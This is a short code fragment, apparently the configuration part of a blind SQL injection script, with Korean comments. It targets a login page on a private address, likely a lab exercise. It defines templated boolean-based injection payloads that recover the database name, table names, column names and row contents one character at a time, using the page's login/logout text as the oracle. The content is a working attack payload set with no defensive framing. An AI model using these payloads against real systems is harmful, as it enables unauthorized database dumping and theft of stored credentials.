check_url = "http://192.0.0.2:33061/C1/index.php";#판별 여부를 위한 url
url = 'http://192.0.0.2:33061/C1/loginaction.php';#페이지가 DB 와 상호작용하는 url


uid = 'root';
db_query = "' AND (ascii(substring((select database()),{},1)) > {}) AND '1' = '1' # ";
true = "로그아웃"
false = "로그인"
table_query = "' AND (ascii(substring((select table_name from information_schema.tables where table_schema='{}' limit {},1),{},1)) > {}) AND '1' = '1' # ";
column_query = "' AND (ascii(substring((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{}' AND TABLE_NAME = '{}' limit {},1),{},1)) > {}) AND '1' = '1' # ";
data_query = "' AND (ascii(substring((select {} from {} limit {},1),{},1)) > {}) AND '1' = '1' # ";


